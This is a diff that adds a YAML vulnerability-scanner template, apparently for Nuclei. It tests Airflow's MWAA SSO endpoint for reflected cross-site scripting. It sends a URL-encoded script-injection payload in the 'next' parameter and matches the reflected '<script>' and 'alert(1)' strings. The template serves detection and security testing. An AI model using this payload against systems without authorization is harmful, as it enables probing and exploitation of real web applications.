@@ -1,0 +1,23 @@
+id: airflow-xss-next-param-custom
+info:
+  name: Airflow Reflected XSS via next param (Custom)
+  author: watch-recon
+  severity: medium
+  description: Checks if Airflow reflects user input in next param without encoding
+  tags: airflow,xss,reflected
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/aws_mwaa/aws-console-sso?next=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "alert(1)"
+          - "<script>"
+        condition: and
